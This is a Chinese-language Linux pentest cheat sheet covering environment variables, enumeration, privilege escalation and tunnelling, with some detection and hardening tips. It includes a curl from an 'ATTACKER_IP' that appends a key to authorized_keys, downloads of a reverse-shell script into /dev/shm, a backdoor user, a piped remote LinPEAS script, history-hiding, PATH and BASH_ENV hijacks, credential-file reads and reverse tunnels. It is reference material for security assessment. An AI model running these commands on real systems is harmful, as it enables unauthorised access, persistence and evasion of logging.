---

# Linux 安全基础：系统信息收集与网络传输安全

> 本文档整合了Linux系统基础知识、网络通信、加密传输、代理转发相关的安全技术，涵盖渗透测试和安全评估中的系统枚举与网络操作。

---

## 目录

1. [Linux环境变量](#1-linux环境变量)
2. [常用Linux命令](#2-常用linux命令)
3. [基本枚举命令](#3-基本枚举命令)
4. [权限提升方法论与自动化工具](#4-权限提升方法论与自动化工具)
5. [网络通信与传输安全](#5-网络通信与传输安全)
6. [综合信息收集与枚举清单](#6-综合信息收集与枚举清单)
7. [参考资料](#7-参考资料)

---

## 1. Linux环境变量

### 1.1 全局变量

全局变量**将被子进程继承**。

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL       # 输出: hello world
unset MYGLOBAL       # 删除变量
```

### 1.2 局部变量

局部变量只能被**当前 shell/脚本**访问。

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

### 1.3 列出当前变量

```bash
set
env
printenv
cat /proc/$$/environ
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

### 1.4 常用变量

| 变量 | 说明 |
|------|------|
| **DISPLAY** | X使用的显示，通常为`:0.0` |
| **EDITOR** | 用户首选的文本编辑器 |
| **HISTFILESIZE** | 历史文件中最大行数 |
| **HISTSIZE** | 会话结束时添加到历史文件的行数 |
| **HOME** | 主目录 |
| **HOSTNAME** | 计算机主机名 |
| **LANG** | 当前语言 |
| **PATH** | 二进制文件搜索路径 |
| **PWD** | 当前工作目录 |
| **SHELL** | 当前命令shell路径 |
| **TERM** | 当前终端类型 |
| **USER** | 当前用户名 |

### 1.5 用于攻击的环境变量

#### 1.5.1 隐藏历史记录

```bash
export HISTFILESIZE=0          # 截断历史文件为0行
export HISTSIZE=0              # 不保留内存中的历史记录
export HISTCONTROL=ignorespace # 以空格开头的命令不保存
export HISTFILE=/dev/null      # 历史文件指向null
unset HISTFILE                 # 或完全取消设置
```

#### 1.5.2 代理与TLS覆盖

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
export SSL_CERT_FILE=/path/to/ca-bundle.pem     # 使curl、git等信任自定义CA
export SSL_CERT_DIR=/path/to/ca-certificates
```

#### 1.5.3 PATH劫持

如果特权包装器/脚本不使用绝对路径执行命令，`PATH`中第一个攻击者控制的目录将胜出。

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

#### 1.5.4 HOME和XDG_CONFIG_HOME

许多工具会自动从`$HOME`或`$XDG_CONFIG_HOME`加载点文件、插件和用户配置。如果特权工作流保留了这些值，配置注入可能比二进制劫持更容易。

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
```

有趣的目标：`.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`、`.terraformrc`

#### 1.5.5 LD_PRELOAD、LD_LIBRARY_PATH和LD_AUDIT

影响动态链接器的行为：
- `LD_PRELOAD`：强制首先加载额外的共享对象
- `LD_LIBRARY_PATH`：前置库搜索目录
- `LD_AUDIT`：加载审计器库以观察库加载

在安全执行模式下（`AT_SECURE`，如setuid/setgid），加载器会剥离这些变量。

#### 1.5.6 GLIBC_TUNABLES

改变glibc行为。**Looney Tunables**漏洞（2023）提醒我们，加载器中解析的单个环境变量可以成为本地提权原语。

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

#### 1.5.7 BASH_ENV和ENV

Bash以非交互方式启动时会检查`BASH_ENV`并在运行目标脚本之前加载该文件。

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

#### 1.5.8 PYTHONPATH、PYTHONHOME、PYTHONSTARTUP

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
```

#### 1.5.9 PERL5OPT和PERL5LIB

```bash
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
其他类似运行时变量：`RUBYOPT`、`NODE_OPTIONS`等。

---

## 2. 常用Linux命令

### 2.1 基础Bash命令

```bash
base64 -w 0 file

xxd -p boot12.bin | tr -d '\n'

curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

wc -l <file>    # 行数
wc -c           # 字符数

sort -nr                    # 按数字排序然后反转
cat file | sort | uniq      # 排序并删除重复项

sed -i 's/OLD/NEW/g' path/file

wget 10.10.14.14:8000/shell.py -O /dev/shm/.rev.py
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

useradd -p 'openssl passwd -1 <Password>' hacker

python3 -m http.server
php -S $ip:80
```

### 2.2 网络进程文件查看

```bash
lsof                        # 属于任何进程的打开文件
lsof -p 3                   # 进程使用的打开文件
lsof -i                     # 网络进程使用的文件
lsof -i 4 -a -p 124        # 进程124的所有IPv4网络文件
lsof -i :80                 # 端口80相关文件
fuser -nv tcp 80

ls -l /proc/<PID>/fd                     # 每个进程的文件描述符
readlink /proc/<PID>/fd/<FD>             # 解析确切的FD目标
cat /proc/<PID>/fd/<FD>                  # 通过已打开的FD读取
find /proc/[0-9]*/fd -lname '*deleted*'  # 仍被打开的已删除文件
lsof +L1                                 # 另一种查找方法
```

### 2.3 解压

```bash
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz
```

### 2.4 Curl技巧

```bash
curl --header "Content-Type: application/json" --request POST \
  --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint

curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint
```

### 2.5 OpenSSL命令

```bash
openssl s_client -connect 10.10.10.127:443             # 从服务器获取证书
openssl x509 -in ca.cert.pem -text                      # 读取证书
openssl genrsa -out newuser.key 2048                     # 创建RSA2048密钥
openssl req -new -key newuser.key -out newuser.csr       # 生成CSR
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz  # 解密
```

### 2.6 Grep搜索

```bash
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

grep -i "pwd\|passw" file.txt

egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt

grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
```

### 2.7 Find命令

```bash
find / -perm /u=s -ls 2>/dev/null

find / -perm /g=s -ls 2>/dev/null

find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | sort -n -r

find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | sort -n -r

find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | sort -n -r

find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -ls 2>/dev/null
```

### 2.8 Iptables防火墙

```bash
iptables --flush                          # 删除当前规则和链
iptables --delete-chain
iptables -A INPUT -i lo -j ACCEPT         # 允许回环
iptables -A INPUT -p icmp -j DROP         # 丢弃ICMP
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A INPUT -s 10.10.10.10/24 -p tcp --dport 22 -j ACCEPT  # 允许SSH
iptables -P INPUT DROP                    # 默认策略
```

### 2.9 eBPF遥测与Rootkit检测

```bash
sudo bpftool prog                                    # 枚举所有eBPF程序
sudo bpftool prog dump xlated id 835                 # 检查可疑字节码
sudo bpftool map show id 104                         # 列出程序map
sudo bpftool map dump id 104 | hexdump -C            # 转储map内容
sudo bpftool feature probe                           # 验证内核功能支持
sudo ebpfmon                                         # 实时跟踪TUI
```

### 2.10 Journald事件分类

```bash
journalctl --list-boots                                # 枚举启动ID
journalctl -b -1 -p err -o short-iso                   # 上一次启动的错误
journalctl -u ssh.service -f | grep "Failed password"  # 实时暴力破解监控
journalctl _UID=0 --output=json-pretty --since "1 hour ago"
journalctl --disk-usage                                # 日志大小
sudo journalctl --vacuum-size=1G --vacuum-time=7days   # 清理日志
```

---

## 3. 基本枚举命令

```bash
# 系统信息
cat /etc/issue && cat /etc/os-release && uname -a

# 用户信息
id && whoami && cat /etc/passwd && cat /etc/group

# 网络信息
ifconfig && ip addr && netstat -tulnp

# 进程信息
ps aux

# 计划任务
crontab -l && ls -la /etc/cron* && cat /etc/crontab

# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查找可写文件
find / -writable -type f 2>/dev/null

# 查找可执行文件
find / -executable -type f 2>/dev/null

# 查找最近修改的文件
find / -mtime -1 -type f 2>/dev/null

# 查找 world-writable 文件和目录
find / -perm -o+w -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null
```

---

## 4. 权限提升方法论与自动化工具

### 4.1 权限提升核心概念

权限提升通常涉及从较低权限转到较高权限。在渗透测试中，您可能获得了一个低权限 shell，想要获得管理权限。

在 Linux 上有多种提升权限的方式，包括：
- 内核漏洞利用
- 使用 SUID 二进制文件
- 利用 Sudo 权限
- 利用具有 root 权限的 cron 作业
- 利用具有较高权限的进程/服务
- 文件系统相关漏洞利用
- 凭据收集

### 4.2 自动化枚举工具

#### 4.2.1 综合枚举工具

| 工具名称 | 功能描述 | 使用方法 |
|---------|---------|---------|
| **LinPEAS** | Linux 权限提升建议套件，可枚举几乎所有可提权项，甚至可通过su暴力破解本地密码 | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **LinEnum** | 综合枚举脚本，扫描系统配置、权限、服务等 | `./LinEnum.sh -r results.txt -e /tmp/ -t` |
| **linux-smart-enumeration** | 智能枚举工具，根据优先级分类显示结果 | 直接运行主脚本 |
| **Enumy** | 快速枚举工具，检查常见配置错误 | 直接运行 |

#### 4.2.2 专项检测工具

| 工具名称 | 功能描述 | 使用方法 |
|---------|---------|---------|
| **Linux Exploit Suggester** | 内核漏洞利用建议，根据内核版本匹配已知漏洞 | `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && chmod +x les.sh && ./les.sh` |
| **pspy** | 进程监控，识别频繁执行的易受攻击进程 | `./pspy64 -pf -i 1000` |
| **lynis** | 系统安全审计，检测潜在安全问题 | `lynis audit system` 或 `lynis -check-all` |
| **BeRoot** | 权限提升检查，多平台支持 | 直接运行 |
| **Kernelpop** | 枚举 Linux 和 MAC 中的内核漏洞 | 直接运行 |
| **Metasploit** | `multi/recon/local_exploit_suggester` 模块 | `use multi/recon/local_exploit_suggester` |
| **EvilAbigail** | 物理访问场景下的权限提升 | 直接运行 |
| **FallOfSudo** | Sudo配置审计，检测不安全的sudoers配置 | 直接运行 |

### 4.3 手动信息收集

#### 4.3.1 内核与系统信息

```bash
uname -a                    # 打印所有可用的系统信息
uname -r                    # 内核版本
uname -n                    # 系统主机名
uname -m                    # 查看系统内核架构（64位/32位）
hostname                    # 系统主机名
cat /proc/version           # 查看系统信息
cat /etc/*-release          # 分发信息
cat /etc/issue              # 分发信息
cat /proc/cpuinfo           # CPU信息
```

#### 4.3.2 用户与权限信息

```bash
whoami                      # 当前用户名
id                          # 当前用户信息
w                           # 查看活动用户
last                        # 查看用户登录日志
cat /etc/passwd             # 查看系统所有用户
cat /etc/group              # 查看系统所有组
cat /etc/sudoers            # 谁被允许以root身份执行
sudo -l                     # 当前用户可以以root身份执行操作
```

超级用户账户查找：
```bash
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
```

#### 4.3.3 网络环境信息

**网卡与路由：**
```bash
ifconfig 或 ip addr         # 查看网卡
route -n                    # 查看路由表
cat /etc/network/interfaces # 查看网络接口信息
cat /etc/sysconfig/network  # 查看网络信息
```

**防火墙与通信：**
```bash
iptables -L                 # 查看防火墙设置
netstat -tupln              # 查看所有正在监听的端口
netstat -antp               # 查看所有已经建立的链接
netstat -s                  # 查看网络统计信息
lsof -i
lsof -i :80
```

**DNS与配置：**
```bash
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
dnsdomainname
```

#### 4.3.4 环境变量与配置

```bash
env 或 set                  # 显示环境变量
echo $PATH                  # 路径信息
history                     # 显示当前用户的历史命令记录
pwd                         # 输出工作目录
cat /etc/profile            # 显示默认系统变量
cat /etc/shells             # 显示可用的shell
```

环境变量中敏感信息排查：
```bash
(env || set) 2>/dev/null
```

#### 4.3.5 敏感文件与凭据

**密码与密钥：**
```bash
grep -r "password" /etc/ 2>/dev/null
cat ~/.bash_history
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

**用户相关文件：**
```bash
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

**SSH密钥信息：**
```bash
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

#### 4.3.6 文件系统分析

**可写文件与目录：**
```bash
find / -writable -type d 2>/dev/null              # world-writeable folders
find / -perm -222 -type d 2>/dev/null             # world-writeable folders
find / -perm -o w -type d 2>/dev/null             # world-writeable folders
find / -perm -o x -type d 2>/dev/null             # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
```

**/etc配置文件可写性：**
```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
find /etc/ -readable -type f 2>/dev/null
find /etc/ -readable -type f -maxdepth 1 2>/dev/null
```

**无属主文件：**
```bash
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print                  # Noowner files
```

#### 4.3.7 进程与服务信息

**进程查看：**
```bash
ps -ef                      # 查看所有进程
top                         # 实时显示进程状态
ps aux
cat /etc/services           # 查看服务
```

**已安装应用程序：**
```bash
ls -alh /usr/bin/
ls -alh /sbin
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

**服务配置：**
```bash
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
```

**定时任务：**
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### 4.4 快速检查清单

```bash
# 系统信息
cat /etc/issue; cat /etc/os-release; uname -a

# 用户信息
id; whoami; cat /etc/passwd; cat /etc/group

# 网络信息
ifconfig; ip addr; netstat -tulnp

# 进程信息
ps aux

# 计划任务
crontab -l; ls -la /etc/cron*; cat /etc/crontab

# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查找可写文件
find / -writable -type f 2>/dev/null
```

---

## 5. 网络通信与传输安全

### 5.1 SSH转发代理利用

#### 5.1.1 概念

SSH代理（ssh-agent）管理SSH私钥并将其转发到远程服务器。如果攻击者能够访问正在运行的SSH代理，可以利用代理中加载的密钥连接到其他主机，而无需知道密钥密码。

#### 5.1.2 检测

```bash
# 检查SSH_AUTH_SOCK环境变量
echo $SSH_AUTH_SOCK

# 列出代理中的密钥
ssh-add -l

# 检查是否有活跃的SSH代理
ps aux | grep ssh-agent

# 检查SSH配置
cat ~/.ssh/config
cat /etc/ssh/ssh_config
```

#### 5.1.3 利用

```bash
# 如果SSH_AUTH_SOCK指向攻击者可访问的socket
# 可以使用代理中的密钥连接其他主机
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh user@target-host

# 转发代理到远程主机（-A选项）
ssh -A user@intermediate-host
# 在中间主机上，可以直接使用本地代理中的密钥
ssh user@final-target
```

#### 5.1.4 防护

- 不要在不信任的主机上使用ssh-agent转发
- 使用`-J`（ProxyJump）替代`-A`（AgentForwarding）
- 使用`ssh-add -c`要求每次使用密钥时确认

### 5.2 网络枚举

```bash
# 查看网络接口
ip addr show
ifconfig -a

# 查看路由表
ip route show
route -n

# 查看ARP缓存
ip neigh show
arp -a

# 查看监听端口
ss -tlnp
netstat -tlnp

# 查看已建立连接
ss -tnp
netstat -tnp

# 查看防火墙规则
iptables -L -n -v
iptables -t nat -L -n -v
nft list ruleset
```

### 5.3 DNS枚举

```bash
# 查看DNS配置
cat /etc/resolv.conf

# DNS查询
nslookup example.com
dig example.com
dig ANY example.com @<dns-server>
dig -x <ip-address>  # 反向DNS

# 区域传送
dig axfr example.com @<dns-server>
```

### 5.4 网络嗅探

```bash
# 使用tcpdump捕获流量
tcpdump -i eth0 -w capture.pcap
tcpdump -i any port 80 -A
tcpdump -i any host <target-ip>

# 使用tshark（Wireshark CLI）
tshark -i eth0 -f "port 80"
```

### 5.5 文件传输

```bash
# Python HTTP服务器
python3 -m http.server 8080
python2 -m SimpleHTTPServer 8080

# 使用netcat传输文件
# 接收端
nc -lvnp 4444 > received_file
# 发送端
nc <target-ip> 4444 < file_to_send

# 使用wget/curl下载
wget http://<server>/file
curl -O http://<server>/file

# 使用scp传输
scp file user@host:/path/
scp user@host:/path/file ./

# 使用base64编码传输（无特殊字符问题）
# 发送端
base64 -w0 file_to_send
# 接收端
echo '<base64_content>' | base64 -d > received_file
```

### 5.6 代理与隧道

```bash
# SSH本地端口转发
ssh -L 8080:target:80 user@ssh-server

# SSH远程端口转发
ssh -R 8080:localhost:80 user@ssh-server

# SSH动态端口转发（SOCKS代理）
ssh -D 1080 user@ssh-server

# 使用chisel创建隧道
# 服务端
chisel server --reverse --port 8080
# 客户端
chisel client <server-ip>:8080 R:socks

# 使用socat端口转发
socat TCP-LISTEN:8080,fork TCP:target:80

# 使用netcat端口转发
mkfifo /tmp/backpipe
nc -lvnp 8080 0< /tmp/backpipe | nc target 80 1> /tmp/backpipe
```

### 5.7 网络扫描

```bash
# nmap扫描
nmap -sV -sC -p- <target>
nmap -sn <network>/24  # 主机发现
nmap -sU -p 53,67,68,69,123,161,162 <target>  # UDP扫描

# 使用netcat扫描
nc -zv <target> 1-1000 2>&1 | grep -v refused
```

---

## 6. 综合信息收集与枚举清单

### 1. 系统基本信息

- 主机名
- 内核版本号
- 操作系统发行版名称和版本
- 系统架构
- 系统运行时间
- CPU 型号和核心数
- 内存总量和使用情况
- 磁盘分区列表
- 挂载点和文件系统类型
- 启动引导加载程序配置
- 容器运行时环境检测（Docker 容器 ID、LXC 配置）
- 云提供商元数据服务访问（AWS、GCP、Azure）

### 2. 用户与组信息

- 当前用户 ID 和组 ID
- /etc/passwd 文件完整内容
- /etc/group 文件完整内容
- 特权用户列表（UID 为 0 的账户）
- sudoers 文件内容和用户 sudo 权限
- 用户登录历史记录
- 最后登录用户列表
- 密码哈希存储位置（/etc/shadow）
- 用户主目录权限
- root 主目录可访问性
- 密码策略配置
- umask 值
- /etc/passwd 中密码哈希存储检查
- 外部认证方法（LDAP、NIS）检查

### 3. 文件系统与权限

- SUID 权限文件完整列表
- SGID 权限文件完整列表
- 文件 capabilities 列表
- 世界可写文件和目录
- 包含密码或凭证的配置文件
- SSH 公钥和私钥文件
- /etc 目录下敏感配置文件权限
- NFS 挂载配置和权限
- 主目录可写性检查
- /etc/shadow 可读性检查
- 父目录权限检查
- 组可写文件或目录（多用户组检查）
- 打开文件句柄权限检查
- 脚本中调用文件的权限检查

### 4. 网络配置与暴露

- 网络接口 IP 地址列表
- 默认网关地址
- DNS 服务器地址
- 监听 TCP 端口列表
- 监听 UDP 端口列表
- 活跃网络连接列表
- 防火墙规则（iptables、ufw）
- SSH 服务配置
- SNMP 配置
- LDAP 配置

### 5. 进程、服务与调度任务

- 运行中进程完整列表（ps aux）
- systemd 服务状态列表
- cron 定时任务列表
- at 计划任务列表
- systemd timer 列表
- 邮件服务配置
- 打印服务配置
- 数据库服务配置（MySQL 等）
- 启动服务列表
- 最近访问文件列表

### 6. 环境与配置

- PATH 环境变量完整内容
- 其他环境变量列表
- 当前 Shell 类型
- .bashrc 文件内容
- .profile 文件内容
- 登录横幅信息
- 密码策略配置

### 7. 软件与包信息

- 已安装软件包完整列表（dpkg、rpm）
- 软件版本号
- PHP 配置和版本
- Web 服务器配置（Apache、Nginx）
- 已安装包的 CVE 漏洞检测

### 8. 安全机制与加固检查

- SELinux 状态
- AppArmor 状态
- ASLR 启用情况
- 二进制文件 PIE 保护状态
- 二进制文件 RELRO 保护状态
- 二进制文件 Stack Canary 保护状态
- 二进制文件 NX bit 保护状态
- 二进制文件 Fortify Source 保护状态
- GRSecurity 内核补丁状态
- 加密算法支持列表
- 日志记录配置（audit daemon）
- 恶意软件扫描结果
- MAC 框架状态
- 进程 accounting 状态
- Sysstat accounting 数据
- 内核 hardening 配置
- 文件完整性检查
- 防火墙配置
- 不安全服务检测
- SSH 支持检查
- SNMP 支持检查
- 数据库服务检查
- LDAP 服务检查
- 内存和进程检查
- 名称服务检查
- PHP 配置检查
- 端口和包检查
- 打印机和 spool 检查
- 调度检查
- Shell 检查
- Squid 检查
- Storage 检查

### 9. 凭证与敏感数据

- 硬编码密码字符串
- API 密钥正则匹配结果
- 数据库连接字符串
- SSH 密钥文件内容
- htpasswd 文件

### 10. 容器与云环境

- Docker 容器检测
- LXC 容器检测
- Kubernetes 配置
- AWS 元数据访问
- GCP 元数据访问
- Azure 元数据访问

---

## 7. 参考资料

- [0xdf – setuid rabbithole](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html)
- [GNU Bash 手册 - Bash 启动文件](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [eBPFmon](https://redcanary.com/blog/linux-security/ebpfmon/)
- [如何使用 journalctl 命令查看 Linux 日志](https://www.hostinger.com/tutorials/journalctl-command)

---
